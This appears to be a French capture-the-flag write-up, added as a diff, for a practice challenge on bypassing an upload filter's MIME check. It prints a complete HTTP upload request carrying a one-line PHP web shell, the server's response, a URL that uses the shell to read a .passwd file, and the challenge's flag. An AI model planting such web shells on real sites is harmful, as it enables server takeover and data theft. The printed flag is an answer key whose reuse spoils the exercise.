@@ -1,0 +1,74 @@
+## Methode
+
+
+Modifiez le parametre content-type par image/gif pour injecter un fichier malveillant
+
+POST /web-serveur/ch21/?action=upload HTTP/1.1
+Host: challenge01.root-me.org
+Content-Length: 215
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://challenge01.root-me.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx40NPNlXgZ1PnRpA
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=fnth7ts9flnj7g4bk8a05pik21; status=adm; passwd=test
+Connection: close
+
+------WebKitFormBoundaryx40NPNlXgZ1PnRpA
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: image/gif
+
+<?php
+system($_GET['command']);
+?>
+------WebKitFormBoundaryx40NPNlXgZ1PnRpA--
+
+
+
+
+Response :
+
+<html>
+  <head>
+    <style>body { background: black; color: white; }</style>
+  </head>
+  <body>
+    <h1>Photo gallery v 0.03</h1>
+    <span id=menu/>&nbsp;|&nbsp;
+      <span>
+        <a href='?galerie=defaced'>defaced</a>
+      </span>
+      &nbsp;|&nbsp;
+      <span>
+        <a href='?galerie=upload'>upload</a>
+      </span>
+      &nbsp;|&nbsp;
+      <span>
+        <a href='?galerie=pirate'>
+          <b>pirate</b>
+        </a>
+      </span>
+      <br>
+      <hr>
+      File information&nbsp;:
+      <br>
+      <ul>
+        <li>Upload: test.php</li>
+        <li>Type: image/gif</li>
+        <li>Size: 0.033203125 kB</li>
+        <li>Stored in: /test.php</li>
+      </ul>
+      <b>File uploaded</b>
+      .</body>
+  </html>
+
+
+Puis chercher le flag a la racine dans le fichier .passwd
+http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/fnth7ts9flnj7g4bk8a05pik21//test.php?command=cat%20%20../../../.passwd
+
+Flag:a7n4nizpgQgnPERy89uanf6T4
+
